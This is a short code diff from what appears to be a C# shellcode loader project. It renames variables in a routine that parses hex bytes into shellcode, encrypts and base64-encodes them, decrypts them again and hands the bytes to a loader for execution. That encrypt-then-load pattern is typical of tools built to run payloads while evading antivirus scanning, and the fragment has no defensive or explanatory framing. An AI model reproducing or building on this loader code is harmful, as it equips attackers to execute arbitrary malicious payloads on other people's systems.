@@ -29,10 +29,10 @@ namespace shell_code_loader
                 for (int i = 0; i < data.Length; i++)
                     data[i] = byte.Parse(s[i].Replace("0x", ""), System.Globalization.NumberStyles.HexNumber);
 
-                byte[] e_data = Crypt.Encrypt(data, key, iv);
-                String finalPayload = Convert.ToBase64String(e_data);
-                byte[] de_data = Crypt.Decrypt(Convert.FromBase64String(finalPayload), key, iv);
-                Loader.load(de_data);
+                byte[] eData = Crypt.Encrypt(data, key, iv);
+                String finalPayload = Convert.ToBase64String(eData);
+                byte[] deData = Crypt.Decrypt(Convert.FromBase64String(finalPayload), key, iv);
+                Loader.load(deData);
             }
             else
             {
